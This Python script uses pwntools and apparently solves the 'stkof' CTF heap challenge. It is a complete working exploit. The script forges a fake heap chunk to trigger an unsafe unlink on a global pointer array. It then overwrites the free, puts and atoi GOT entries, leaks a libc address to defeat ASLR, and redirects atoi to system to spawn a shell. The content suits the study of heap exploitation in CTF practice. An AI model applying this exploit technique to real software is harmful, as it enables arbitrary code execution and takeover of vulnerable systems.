#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "stkof"
libFile  = "libc.so.6"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size):
	sl(str(1))
	sl(str(size))
	ru('OK')

def md(index, text):
	sl(str(2))
	sl(str(index))
	sl(str(len(text)))
	sl(str(text))
	#ru('OK')

def rm(index):
	sl(str(3))
	sl(str(index))
	ru('OK')

def dp(index):
	sla(':', str(4))	
	sl(str(index))
	ru('OK')

#def q():
#	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	list_addr = 0x602140
	#trigger to malloc buffer for io functios
	ad(0x80) #idx 1

	#begin
	ad(0x30) #idx 2
	#small chunk size inorder to trigger unlink
	ad(0x80)
	#fake chunk at global[2] = list_addr + 16 who's size is 0x20
	p = p64(0) #prev_size
	p += p64(0x30) #size
	p += p64(list_addr + 16 - 0x18) #fd
	p += p64(list_addr + 16 - 0x10) #bk
	p += p64(0x30) # next chunk's prev_size bypass the chunk
	p = p.ljust(0x30, '\x00')
	#make it believe that prev chunk is chunk 2
	p += p64(0x30)
	#make it believe thatprev chunk is at chunk 2
	p += p64(0x90)
	md(2, p) #index must be from 1
	# unlink fake chunk, so fake chunk = &fake chunk - 0x18 = list_addr - 8
	rm(3)
	#db()

	p = 'A' * 8 + p64(exe.got['free'])  #idx 0
	p += p64(exe.got['puts']) #idx 1
	p += p64(exe.got['atoi']) #idx 2
	md(2, p)

	md(0, p64(exe.plt['puts']))
	rm(1) #puts exe.got['puts']
	puts_addr = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base = puts_addr - lib.sym['puts']
	li('puts_addr: ' + hex(puts_addr))
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']

	md(2, p64(sys_addr))

	sl('sh')

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

